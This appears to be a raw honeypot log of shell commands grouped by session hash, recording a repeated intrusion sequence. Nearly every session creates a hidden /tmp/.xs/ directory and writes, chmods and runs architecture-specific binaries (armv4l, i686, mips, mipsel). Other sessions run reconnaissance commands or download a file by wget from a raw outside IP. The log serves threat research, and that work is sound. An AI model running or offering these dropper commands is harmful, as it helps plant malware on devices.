14f0ed605a4d4b51b8b24ae9ef74a321	cat  > /tmp/.xs/daemon.armv4l.mod
14f0ed605a4d4b51b8b24ae9ef74a321	chmod 777 /tmp/.xs/daemon.armv4l.mod
14f0ed605a4d4b51b8b24ae9ef74a321	/tmp/.xs/daemon.armv4l.mod
cc1d59fc5b824c048dcfc0efb5fd8ec9	mkdir /tmp/.xs/
cc1d59fc5b824c048dcfc0efb5fd8ec9	cat  > /tmp/.xs/daemon.i686.mod
cc1d59fc5b824c048dcfc0efb5fd8ec9	chmod 777 /tmp/.xs/daemon.i686.mod
cc1d59fc5b824c048dcfc0efb5fd8ec9	/tmp/.xs/daemon.i686.mod
7384e89e8b654b8ea1d5c3e2631ae770	mkdir /tmp/.xs/
7384e89e8b654b8ea1d5c3e2631ae770	cat  > /tmp/.xs/daemon.mips.mod
7384e89e8b654b8ea1d5c3e2631ae770	chmod 777 /tmp/.xs/daemon.mips.mod
7384e89e8b654b8ea1d5c3e2631ae770	/tmp/.xs/daemon.mips.mod
e701a334a44a4c079bec4324729049be	mkdir /tmp/.xs/
e701a334a44a4c079bec4324729049be	cat  > /tmp/.xs/daemon.mipsel.mod
e701a334a44a4c079bec4324729049be	chmod 777 /tmp/.xs/daemon.mipsel.mod
e701a334a44a4c079bec4324729049be	/tmp/.xs/daemon.mipsel.mod
6263c96df2aa466692618b8689f569a4	mkdir /tmp/.xs/
6263c96df2aa466692618b8689f569a4	cat  > /tmp/.xs/test.mod
6263c96df2aa466692618b8689f569a4	chmod 777 /tmp/.xs/test.mod
6263c96df2aa466692618b8689f569a4	/tmp/.xs/test.mod
73a1f744adac4c4484c1f773db084007	uname
73a1f744adac4c4484c1f773db084007	free -m
73a1f744adac4c4484c1f773db084007	ps x
cb6fb6c0d24a49e6bde31fb7eb2f28de	echo -n test
cb6fb6c0d24a49e6bde31fb7eb2f28de	cat /proc/version
51888d6938974fd79656ae9b01357137	mkdir /tmp/.xs/
51888d6938974fd79656ae9b01357137	cat  > /tmp/.xs/daemon.armv4l.mod
51888d6938974fd79656ae9b01357137	chmod 777 /tmp/.xs/daemon.armv4l.mod
51888d6938974fd79656ae9b01357137	/tmp/.xs/daemon.armv4l.mod
1d4d454501264403b180236cf99c8da5	mkdir /tmp/.xs/
1d4d454501264403b180236cf99c8da5	cat  > /tmp/.xs/daemon.i686.mod
1d4d454501264403b180236cf99c8da5	chmod 777 /tmp/.xs/daemon.i686.mod
1d4d454501264403b180236cf99c8da5	/tmp/.xs/daemon.i686.mod
7ce2b02cf574421da3154f774aa97082	mkdir /tmp/.xs/
7ce2b02cf574421da3154f774aa97082	cat  > /tmp/.xs/daemon.mips.mod
7ce2b02cf574421da3154f774aa97082	chmod 777 /tmp/.xs/daemon.mips.mod
7ce2b02cf574421da3154f774aa97082	/tmp/.xs/daemon.mips.mod
e3bd6349623544d1a6fd7d545fda8319	mkdir /tmp/.xs/
e3bd6349623544d1a6fd7d545fda8319	cat  > /tmp/.xs/daemon.mipsel.mod
e3bd6349623544d1a6fd7d545fda8319	chmod 777 /tmp/.xs/daemon.mipsel.mod
e3bd6349623544d1a6fd7d545fda8319	/tmp/.xs/daemon.mipsel.mod
ea0736e427f34738bf28143643b0a06a	echo -n test
ea0736e427f34738bf28143643b0a06a	cat /proc/version
204190b0e7eb4af39c070f1de97a0f5c	mkdir /tmp/.xs/
204190b0e7eb4af39c070f1de97a0f5c	cat  > /tmp/.xs/daemon.armv4l.mod
204190b0e7eb4af39c070f1de97a0f5c	chmod 777 /tmp/.xs/daemon.armv4l.mod
204190b0e7eb4af39c070f1de97a0f5c	/tmp/.xs/daemon.armv4l.mod
ab69ae98ed5d4bb0b1ee6068cf10eab0	mkdir /tmp/.xs/
ab69ae98ed5d4bb0b1ee6068cf10eab0	cat  > /tmp/.xs/daemon.i686.mod
ab69ae98ed5d4bb0b1ee6068cf10eab0	chmod 777 /tmp/.xs/daemon.i686.mod
ab69ae98ed5d4bb0b1ee6068cf10eab0	/tmp/.xs/daemon.i686.mod
5f4c65ada9584e56a867d021bc1fc1c1	mkdir /tmp/.xs/
5f4c65ada9584e56a867d021bc1fc1c1	cat  > /tmp/.xs/daemon.mips.mod
5f4c65ada9584e56a867d021bc1fc1c1	chmod 777 /tmp/.xs/daemon.mips.mod
5f4c65ada9584e56a867d021bc1fc1c1	/tmp/.xs/daemon.mips.mod
2c148bbd822a4d82ac846f54aa8ef227	wget http://107.178.93.23/abf/f13
2c148bbd822a4d82ac846f54aa8ef227	ls -la /var/run/gcc.pid
2b4841d9c0a3451384f2d40c2025ae8f	mkdir /tmp/.xs/
2b4841d9c0a3451384f2d40c2025ae8f	cat  > /tmp/.xs/daemon.armv4l.mod
2b4841d9c0a3451384f2d40c2025ae8f	chmod 777 /tmp/.xs/daemon.armv4l.mod
2b4841d9c0a3451384f2d40c2025ae8f	/tmp/.xs/daemon.armv4l.mod
d4d096360b5947ccb754d273a2ca1e67	mkdir /tmp/.xs/
d4d096360b5947ccb754d273a2ca1e67	cat  > /tmp/.xs/daemon.i686.mod
d4d096360b5947ccb754d273a2ca1e67	chmod 777 /tmp/.xs/daemon.i686.mod
d4d096360b5947ccb754d273a2ca1e67	/tmp/.xs/daemon.i686.mod
9485835c7aa24817866c9be670e6f092	mkdir /tmp/.xs/
9485835c7aa24817866c9be670e6f092	cat  > /tmp/.xs/daemon.mips.mod
9485835c7aa24817866c9be670e6f092	chmod 777 /tmp/.xs/daemon.mips.mod
9485835c7aa24817866c9be670e6f092	/tmp/.xs/daemon.mips.mod
ff9086ed56814ccc89faca8219815cb9	mkdir /tmp/.xs/
ff9086ed56814ccc89faca8219815cb9	cat  > /tmp/.xs/daemon.mipsel.mod
ff9086ed56814ccc89faca8219815cb9	chmod 777 /tmp/.xs/daemon.mipsel.mod
ff9086ed56814ccc89faca8219815cb9	/tmp/.xs/daemon.mipsel.mod
56c183dff4d54dc984beedeed3727ba7	mkdir /tmp/.xs/
56c183dff4d54dc984beedeed3727ba7	cat  > /tmp/.xs/daemon.armv4l.mod
56c183dff4d54dc984beedeed3727ba7	chmod 777 /tmp/.xs/daemon.armv4l.mod
56c183dff4d54dc984beedeed3727ba7	/tmp/.xs/daemon.armv4l.mod
54e6c3904f6c41aa8215d1663ea455c5	mkdir /tmp/.xs/
54e6c3904f6c41aa8215d1663ea455c5	cat  > /tmp/.xs/daemon.i686.mod
54e6c3904f6c41aa8215d1663ea455c5	chmod 777 /tmp/.xs/daemon.i686.mod
54e6c3904f6c41aa8215d1663ea455c5	/tmp/.xs/daemon.i686.mod
6fc91455bbe549609c2799dbe6ab433a	mkdir /tmp/.xs/
6fc91455bbe549609c2799dbe6ab433a	cat  > /tmp/.xs/daemon.mips.mod
6fc91455bbe549609c2799dbe6ab433a	chmod 777 /tmp/.xs/daemon.mips.mod
6fc91455bbe549609c2799dbe6ab433a	/tmp/.xs/daemon.mips.mod
2f949d37eaf743768f4e2e69e70c5814	mkdir /tmp/.xs/
2f949d37eaf743768f4e2e69e70c5814	cat  > /tmp/.xs/daemon.mipsel.mod
2f949d37eaf743768f4e2e69e70c5814	chmod 777 /tmp/.xs/daemon.mipsel.mod
2f949d37eaf743768f4e2e69e70c5814	/tmp/.xs/daemon.mipsel.mod
6b6921e1d374400fb44f0e5b9d5ac055	mkdir /tmp/.xs/
6b6921e1d374400fb44f0e5b9d5ac055	cat  > /tmp/.xs/daemon.armv4l.mod
6b6921e1d374400fb44f0e5b9d5ac055	chmod 777 /tmp/.xs/daemon.armv4l.mod
6b6921e1d374400fb44f0e5b9d5ac055	/tmp/.xs/daemon.armv4l.mod
f8b55a89c5454dcea5a74d9ab96380ea	mkdir /tmp/.xs/
f8b55a89c5454dcea5a74d9ab96380ea	cat  > /tmp/.xs/daemon.i686.mod
f8b55a89c5454dcea5a74d9ab96380ea	chmod 777 /tmp/.xs/daemon.i686.mod
f8b55a89c5454dcea5a74d9ab96380ea	/tmp/.xs/daemon.i686.mod
aee810cf1d424b0cb6ea280a199d1af9	mkdir /tmp/.xs/
aee810cf1d424b0cb6ea280a199d1af9	cat  > /tmp/.xs/daemon.mips.mod
aee810cf1d424b0cb6ea280a199d1af9	chmod 777 /tmp/.xs/daemon.mips.mod
aee810cf1d424b0cb6ea280a199d1af9	/tmp/.xs/daemon.mips.mod
05a456ea0e7947c5bebf26b28987b3cb	mkdir /tmp/.xs/
05a456ea0e7947c5bebf26b28987b3cb	cat  > /tmp/.xs/daemon.mipsel.mod
05a456ea0e7947c5bebf26b28987b3cb	chmod 777 /tmp/.xs/daemon.mipsel.mod
05a456ea0e7947c5bebf26b28987b3cb	/tmp/.xs/daemon.mipsel.mod
40470c0c98a74fea9100a68db78a17d6	mkdir /tmp/.xs/
40470c0c98a74fea9100a68db78a17d6	cat  > /tmp/.xs/daemon.armv4l.mod
40470c0c98a74fea9100a68db78a17d6	chmod 777 /tmp/.xs/daemon.armv4l.mod
40470c0c98a74fea9100a68db78a17d6	/tmp/.xs/daemon.armv4l.mod
b7b6fd84705f49faa213dfdc04b74dd8	mkdir /tmp/.xs/
b7b6fd84705f49faa213dfdc04b74dd8	cat  > /tmp/.xs/daemon.i686.mod
b7b6fd84705f49faa213dfdc04b74dd8	chmod 777 /tmp/.xs/daemon.i686.mod
b7b6fd84705f49faa213dfdc04b74dd8	/tmp/.xs/daemon.i686.mod
22b591ca5fa74c60ace996529eb6b898	mkdir /tmp/.xs/
22b591ca5fa74c60ace996529eb6b898	cat  > /tmp/.xs/daemon.mips.mod
22b591ca5fa74c60ace996529eb6b898	chmod 777 /tmp/.xs/daemon.mips.mod
22b591ca5fa74c60ace996529eb6b898	/tmp/.xs/daemon.mips.mod
cb21e05c03ba43269fc1ceaa4e39a534	mkdir /tmp/.xs/
cb21e05c03ba43269fc1ceaa4e39a534	cat  > /tmp/.xs/daemon.armv4l.mod
cb21e05c03ba43269fc1ceaa4e39a534	chmod 777 /tmp/.xs/daemon.armv4l.mod
cb21e05c03ba43269fc1ceaa4e39a534	/tmp/.xs/daemon.armv4l.mod
48a34dbb81e0488389c7f166dcb551ac	mkdir /tmp/.xs/
48a34dbb81e0488389c7f166dcb551ac	cat  > /tmp/.xs/daemon.i686.mod
48a34dbb81e0488389c7f166dcb551ac	chmod 777 /tmp/.xs/daemon.i686.mod
48a34dbb81e0488389c7f166dcb551ac	/tmp/.xs/daemon.i686.mod
76e43b5f7f924d09b65129157686d427	mkdir /tmp/.xs/
76e43b5f7f924d09b65129157686d427	cat  > /tmp/.xs/daemon.mips.mod
76e43b5f7f924d09b65129157686d427	chmod 777 /tmp/.xs/daemon.mips.mod
76e43b5f7f924d09b65129157686d427	/tmp/.xs/daemon.mips.mod
052068bc297c4e938dbddc6aabe702c0	mkdir /tmp/.xs/
052068bc297c4e938dbddc6aabe702c0	cat  > /tmp/.xs/daemon.armv4l.mod
052068bc297c4e938dbddc6aabe702c0	chmod 777 /tmp/.xs/daemon.armv4l.mod
052068bc297c4e938dbddc6aabe702c0	/tmp/.xs/daemon.armv4l.mod
6a767f5e94494ab8a48fc95b936009ce	mkdir /tmp/.xs/
6a767f5e94494ab8a48fc95b936009ce	cat  > /tmp/.xs/daemon.i686.mod
6a767f5e94494ab8a48fc95b936009ce	chmod 777 /tmp/.xs/daemon.i686.mod
6a767f5e94494ab8a48fc95b936009ce	/tmp/.xs/daemon.i686.mod
16bd756ee4ba4bdd99ac7957d9c8e4df	mkdir /tmp/.xs/
16bd756ee4ba4bdd99ac7957d9c8e4df	cat  > /tmp/.xs/daemon.mips.mod
16bd756ee4ba4bdd99ac7957d9c8e4df	chmod 777 /tmp/.xs/daemon.mips.mod
16bd756ee4ba4bdd99ac7957d9c8e4df	/tmp/.xs/daemon.mips.mod
bc32fc836c2741caa0156f347d2c0e42	mkdir /tmp/.xs/
bc32fc836c2741caa0156f347d2c0e42	cat  > /tmp/.xs/daemon.mipsel.mod
bc32fc836c2741caa0156f347d2c0e42	chmod 777 /tmp/.xs/daemon.mipsel.mod
bc32fc836c2741caa0156f347d2c0e42	/tmp/.xs/daemon.mipsel.mod
a44421787f174c03b1efc3e7f7b99ee5	mkdir /tmp/.xs/
a44421787f174c03b1efc3e7f7b99ee5	cat  > /tmp/.xs/daemon.armv4l.mod
a44421787f174c03b1efc3e7f7b99ee5	chmod 777 /tmp/.xs/daemon.armv4l.mod
a44421787f174c03b1efc3e7f7b99ee5	/tmp/.xs/daemon.armv4l.mod
41f3bf7eb2394507b6f8829878956b87	mkdir /tmp/.xs/
41f3bf7eb2394507b6f8829878956b87	cat  > /tmp/.xs/daemon.i686.mod
41f3bf7eb2394507b6f8829878956b87	chmod 777 /tmp/.xs/daemon.i686.mod
41f3bf7eb2394507b6f8829878956b87	/tmp/.xs/daemon.i686.mod
580812bf8db84be3acb6c47f327f774b	mkdir /tmp/.xs/
580812bf8db84be3acb6c47f327f774b	cat  > /tmp/.xs/daemon.mips.mod
580812bf8db84be3acb6c47f327f774b	chmod 777 /tmp/.xs/daemon.mips.mod
580812bf8db84be3acb6c47f327f774b	/tmp/.xs/daemon.mips.mod
ca08073c923c4f4d852bea8fa4011537	mkdir /tmp/.xs/
ca08073c923c4f4d852bea8fa4011537	cat  > /tmp/.xs/daemon.mipsel.mod
ca08073c923c4f4d852bea8fa4011537	chmod 777 /tmp/.xs/daemon.mipsel.mod
ca08073c923c4f4d852bea8fa4011537	/tmp/.xs/daemon.mipsel.mod
f4f698103071434f9839ab4eb03f5082	mkdir /tmp/.xs/
f4f698103071434f9839ab4eb03f5082	cat  > /tmp/.xs/daemon.armv4l.mod
f4f698103071434f9839ab4eb03f5082	chmod 777 /tmp/.xs/daemon.armv4l.mod
f4f698103071434f9839ab4eb03f5082	/tmp/.xs/daemon.armv4l.mod
ce739793225743ceb0af8f29f4ed0578	mkdir /tmp/.xs/
ce739793225743ceb0af8f29f4ed0578	cat  > /tmp/.xs/daemon.i686.mod
ce739793225743ceb0af8f29f4ed0578	chmod 777 /tmp/.xs/daemon.i686.mod
ce739793225743ceb0af8f29f4ed0578	/tmp/.xs/daemon.i686.mod
78f2671ac74849e18c56d7cb4e86759e	mkdir /tmp/.xs/
78f2671ac74849e18c56d7cb4e86759e	cat  > /tmp/.xs/daemon.mips.mod
78f2671ac74849e18c56d7cb4e86759e	chmod 777 /tmp/.xs/daemon.mips.mod
78f2671ac74849e18c56d7cb4e86759e	/tmp/.xs/daemon.mips.mod
ea429970a7654f00840e4698d5661848	mkdir /tmp/.xs/
ea429970a7654f00840e4698d5661848	cat  > /tmp/.xs/daemon.mipsel.mod
ea429970a7654f00840e4698d5661848	chmod 777 /tmp/.xs/daemon.mipsel.mod
ea429970a7654f00840e4698d5661848	/tmp/.xs/daemon.mipsel.mod
a28f9fafba184311a35fcc4a3f9dc3fb	mkdir /tmp/.xs/
a28f9fafba184311a35fcc4a3f9dc3fb	cat  > /tmp/.xs/daemon.armv4l.mod
a28f9fafba184311a35fcc4a3f9dc3fb	chmod 777 /tmp/.xs/daemon.armv4l.mod
a28f9fafba184311a35fcc4a3f9dc3fb	/tmp/.xs/daemon.armv4l.mod
153d2a1e1989447090dfb324c4b52f50	mkdir /tmp/.xs/
153d2a1e1989447090dfb324c4b52f50	cat  > /tmp/.xs/daemon.i686.mod
153d2a1e1989447090dfb324c4b52f50	chmod 777 /tmp/.xs/daemon.i686.mod
153d2a1e1989447090dfb324c4b52f50	/tmp/.xs/daemon.i686.mod
442ff7828c0c4b91853d7e6526293773	mkdir /tmp/.xs/
442ff7828c0c4b91853d7e6526293773	cat  > /tmp/.xs/daemon.mips.mod
442ff7828c0c4b91853d7e6526293773	chmod 777 /tmp/.xs/daemon.mips.mod
442ff7828c0c4b91853d7e6526293773	/tmp/.xs/daemon.mips.mod
69069d39142b44a492397b38c96990c2	mkdir /tmp/.xs/
69069d39142b44a492397b38c96990c2	cat  > /tmp/.xs/daemon.mipsel.mod
69069d39142b44a492397b38c96990c2	chmod 777 /tmp/.xs/daemon.mipsel.mod
69069d39142b44a492397b38c96990c2	/tmp/.xs/daemon.mipsel.mod
209090fd341e44ee970a96d906014236	mkdir /tmp/.xs/
209090fd341e44ee970a96d906014236	cat  > /tmp/.xs/daemon.armv4l.mod
209090fd341e44ee970a96d906014236	chmod 777 /tmp/.xs/daemon.armv4l.mod
209090fd341e44ee970a96d906014236	/tmp/.xs/daemon.armv4l.mod
52b0e0fc6b9e4c64bd313828da1ef984	mkdir /tmp/.xs/
52b0e0fc6b9e4c64bd313828da1ef984	cat  > /tmp/.xs/daemon.i686.mod
52b0e0fc6b9e4c64bd313828da1ef984	chmod 777 /tmp/.xs/daemon.i686.mod
52b0e0fc6b9e4c64bd313828da1ef984	/tmp/.xs/daemon.i686.mod
829b50da282f4442b59042fd87f6d576	mkdir /tmp/.xs/
829b50da282f4442b59042fd87f6d576	cat  > /tmp/.xs/daemon.mips.mod
829b50da282f4442b59042fd87f6d576	chmod 777 /tmp/.xs/daemon.mips.mod
829b50da282f4442b59042fd87f6d576	/tmp/.xs/daemon.mips.mod
e666f32d6f3a412f984a4c754ec6f961	mkdir /tmp/.xs/
e666f32d6f3a412f984a4c754ec6f961	cat  > /tmp/.xs/daemon.armv4l.mod
e666f32d6f3a412f984a4c754ec6f961	chmod 777 /tmp/.xs/daemon.armv4l.mod
e666f32d6f3a412f984a4c754ec6f961	/tmp/.xs/daemon.armv4l.mod
6fb7315e428144eba0b99fb50d6bb2af	mkdir /tmp/.xs/
6fb7315e428144eba0b99fb50d6bb2af	cat  > /tmp/.xs/daemon.i686.mod
6fb7315e428144eba0b99fb50d6bb2af	chmod 777 /tmp/.xs/daemon.i686.mod
6fb7315e428144eba0b99fb50d6bb2af	/tmp/.xs/daemon.i686.mod
fe786bbfed764f529828af3e80a716f3	mkdir /tmp/.xs/
fe786bbfed764f529828af3e80a716f3	cat  > /tmp/.xs/daemon.mips.mod
fe786bbfed764f529828af3e80a716f3	chmod 777 /tmp/.xs/daemon.mips.mod
fe786bbfed764f529828af3e80a716f3	/tmp/.xs/daemon.mips.mod
dbc4d1376c6b427ba550880fe89cc050	mkdir /tmp/.xs/
dbc4d1376c6b427ba550880fe89cc050	cat  > /tmp/.xs/daemon.mipsel.mod
dbc4d1376c6b427ba550880fe89cc050	chmod 777 /tmp/.xs/daemon.mipsel.mod
dbc4d1376c6b427ba550880fe89cc050	/tmp/.xs/daemon.mipsel.mod
2e455b41b4474e47aa3b2523cf3950f8	mkdir /tmp/.xs/
2e455b41b4474e47aa3b2523cf3950f8	cat  > /tmp/.xs/daemon.armv4l.mod
2e455b41b4474e47aa3b2523cf3950f8	chmod 777 /tmp/.xs/daemon.armv4l.mod
2e455b41b4474e47aa3b2523cf3950f8	/tmp/.xs/daemon.armv4l.mod
fa65a142f5cc43449f565f50f77f0883	mkdir /tmp/.xs/
fa65a142f5cc43449f565f50f77f0883	cat  > /tmp/.xs/daemon.i686.mod
fa65a142f5cc43449f565f50f77f0883	chmod 777 /tmp/.xs/daemon.i686.mod
fa65a142f5cc43449f565f50f77f0883	/tmp/.xs/daemon.i686.mod
7bb8014b72fd465697da60ceb1e5f8f8	mkdir /tmp/.xs/
